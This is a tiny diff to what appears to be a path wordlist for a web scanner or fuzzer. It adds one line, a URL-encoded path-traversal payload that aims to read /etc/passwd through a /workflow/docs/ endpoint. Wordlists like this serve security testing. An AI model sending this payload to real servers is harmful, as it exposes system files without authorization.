@@ -34,3 +34,4 @@
 /{{randstr}}
 /agents
 /api/project
+/workflow/docs/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
